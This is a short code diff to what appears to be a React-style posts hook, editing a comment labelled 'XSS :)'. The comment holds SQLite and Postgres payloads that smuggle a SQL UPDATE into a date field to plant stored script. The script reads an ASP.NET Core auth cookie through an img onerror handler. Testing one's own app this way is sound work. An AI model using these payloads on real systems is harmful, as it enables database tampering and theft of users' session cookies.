@@ -13,8 +13,14 @@ export const usePosts = () => {
 }
 
 /* XSS :)
+Sqlite
 {
    "content":"asd",
-   "createdAt":"2022-03-28T20:16:45.583Z' WHERE ID=1; UPDATE Posts SET CreatedAt='2022-03-28T20:16:45.583Z', Content='<p>tzttttt</p><img src=\"https://www.erorerer123.com/a.jpg\" onerror=\"cookieStore.get(''.AspNetCore.Cookies'').then(function(c){{alert(c.value)}})\" />"
+   "createdAt":"2022-03-28T20:16:45.583Z' WHERE Id=1; UPDATE Posts SET CreatedAt='2022-03-28T20:16:45.583Z', Content='<p>tzttttt</p><img src=\"https://www.erorerer123.com/a.jpg\" onerror=\"cookieStore.get(''.AspNetCore.Cookies'').then(function(c){{alert(c.value)}})\" />"
+}
+Postgres
+{
+   "content":"asd",
+   "createdAt":"2022-03-28T20:16:45.583Z' WHERE \"Id\"=1; UPDATE public.\"Posts\" SET \"CreatedAt\"='2022-03-28T20:16:45.583Z', \"Content\"='<p>tzttttt</p><img src=\"https://www.erorerer123.com/a.jpg\" onerror=\"cookieStore.get(''.AspNetCore.Cookies'').then(function(c){{alert(c.value)}})\" />"
 }
 * */
